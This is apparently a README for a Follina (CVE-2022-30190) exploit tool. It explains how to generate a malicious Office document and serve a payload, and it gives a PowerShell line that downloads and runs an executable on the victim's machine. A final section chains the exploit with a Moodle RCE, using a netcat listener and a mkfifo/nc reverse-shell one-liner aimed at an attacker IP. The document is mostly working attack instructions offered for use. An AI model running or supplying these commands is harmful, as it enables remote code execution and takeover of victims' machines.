# CVE-2022-30190
## Instructions to run the exploit
Run:
```
python3 follina.py
```
This will run a server with an endpoint to serve the index.html. The HTML contains the exploit. This script also generates the malicious document that will call the endpoint.

The server is also used to serve a payload that can be specified with:
```
python3 follina.py -pl payload.exe
```
By default it is payload.exe, and obviously the payload.exe must exist and be an executable that can be executed in the victims machine.

## Attack execution
Once a victim opens the maldoc he will execute:
```
Invoke-WebRequest http://{serve_host}:8000/{args.payload} -OutFile C:\\Windows\\Tasks\\{args.payload}; C:\\Windows\\Tasks\\{args.payload}
```
This downloads the prepared payload and executes it in the victims machine.

You will need a Windows machine with a vulnerable version of Office, tested on Office 2021 offline iso download.

## Instructions to run the exploit in combination with CVE-2024-43425

First have the netcat listening in the attackers machine:
```
nc -nlvp 8888
```
With the RCE of Moodle you can run to have a reverse shell once the generated document is opened:
```
python follina.py -pl moodle_rce_payload.exe -c 'Invoke-WebRequest http://192.168.177.128:8000/moodle_rce_payload.exe -OutFile C:\Windows\Tasks\moodle_rce_payload.exe; C:\Windows\Tasks\moodle_rce_payload.exe --url http://192.168.177.127 --courseid 1 --cmid 1 --cmd '\''rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.177.128 8888 > /tmp/f'\'
```